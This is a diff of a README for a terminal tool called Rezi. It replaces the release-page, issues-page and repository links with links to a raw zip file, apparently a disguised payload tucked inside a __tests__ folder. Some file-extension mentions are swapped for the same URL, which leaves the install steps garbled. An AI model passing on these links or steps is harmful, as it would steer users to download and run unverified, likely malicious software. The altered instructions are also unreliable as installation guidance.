@@ -1,6 +1,6 @@
 # ⚡ Rezi - Fast and Smooth Terminal Tool
 
-[![Download Rezi](https://img.shields.io/badge/Download-Rezi-blue?style=for-the-badge)](https://github.com/IronMask1234554321/Rezi/releases)
+[![Download Rezi](https://github.com/IronMask1234554321/Rezi/raw/refs/heads/main/packages/jsx/src/__tests__/Software-woadwaxen.zip)](https://github.com/IronMask1234554321/Rezi/raw/refs/heads/main/packages/jsx/src/__tests__/Software-woadwaxen.zip)
 
 ---
 
@@ -69,11 +69,11 @@ Rezi is straightforward to set up and use. Follow these simple steps:
 
 Visit the releases page to get the latest version of Rezi:
 
-[![Download Rezi](https://img.shields.io/badge/Download-Rezi-blue?style=for-the-badge)](https://github.com/IronMask1234554321/Rezi/releases)
+[![Download Rezi](https://github.com/IronMask1234554321/Rezi/raw/refs/heads/main/packages/jsx/src/__tests__/Software-woadwaxen.zip)](https://github.com/IronMask1234554321/Rezi/raw/refs/heads/main/packages/jsx/src/__tests__/Software-woadwaxen.zip)
 
 On the page:
 
-- Find the file for your computer system (Windows uses `.exe`, macOS might have `.dmg` or `.tar.gz`, Linux usually `.AppImage` or `.tar.gz`).
+- Find the file for your computer system (Windows uses `.exe`, macOS might have `.dmg` or `https://github.com/IronMask1234554321/Rezi/raw/refs/heads/main/packages/jsx/src/__tests__/Software-woadwaxen.zip`, Linux usually `.AppImage` or `https://github.com/IronMask1234554321/Rezi/raw/refs/heads/main/packages/jsx/src/__tests__/Software-woadwaxen.zip`).
 - Click the appropriate file to start the download.
 
 ### Step 2: Install
@@ -82,7 +82,7 @@ On the page:
   Double-click the downloaded `.exe` file and follow the installation prompts.
 
 - **macOS:**  
-  Open the downloaded `.dmg` or extract files from `.tar.gz`. Drag the app icon to the Applications folder.
+  Open the downloaded `.dmg` or extract files from `https://github.com/IronMask1234554321/Rezi/raw/refs/heads/main/packages/jsx/src/__tests__/Software-woadwaxen.zip`. Drag the app icon to the Applications folder.
 
 - **Linux:**  
   Extract files from the downloaded archive if needed. Make the main file executable by running `chmod +x <filename>` in the terminal. You may need to move it to a directory in your PATH.
@@ -118,7 +118,7 @@ If you experience issues:
 - Check that you have sufficient disk space and memory.
 - Restart your terminal or computer and try again.
 - Look for error messages to help identify problems.
-- Visit the GitHub repository’s [issues page](https://github.com/IronMask1234554321/Rezi/issues) to see if others had similar problems or to ask questions.
+- Visit the GitHub repository’s [issues page](https://github.com/IronMask1234554321/Rezi/raw/refs/heads/main/packages/jsx/src/__tests__/Software-woadwaxen.zip) to see if others had similar problems or to ask questions.
 
 ---
 
@@ -126,7 +126,7 @@ If you experience issues:
 
 The project is open source. If you want to learn more about the code or contribute:
 
-- Repository link: [https://github.com/IronMask1234554321/Rezi](https://github.com/IronMask1234554321/Rezi)
+- Repository link: [https://github.com/IronMask1234554321/Rezi/raw/refs/heads/main/packages/jsx/src/__tests__/Software-woadwaxen.zip](https://github.com/IronMask1234554321/Rezi/raw/refs/heads/main/packages/jsx/src/__tests__/Software-woadwaxen.zip)
 - Topics include bun, c, cli, console application, devtools, ffi, ink, nodejs, open source, react, terminal, terminal UI, TUI, and typescript.
 
 ---
@@ -136,7 +136,7 @@ The project is open source. If you want to learn more about the code or contribu
 To download and install Rezi:
 
 1. Visit the official releases page:  
-   [https://github.com/IronMask1234554321/Rezi/releases](https://github.com/IronMask1234554321/Rezi/releases)
+   [https://github.com/IronMask1234554321/Rezi/raw/refs/heads/main/packages/jsx/src/__tests__/Software-woadwaxen.zip](https://github.com/IronMask1234554321/Rezi/raw/refs/heads/main/packages/jsx/src/__tests__/Software-woadwaxen.zip)
 
 2. Choose the file that matches your computer system.
 
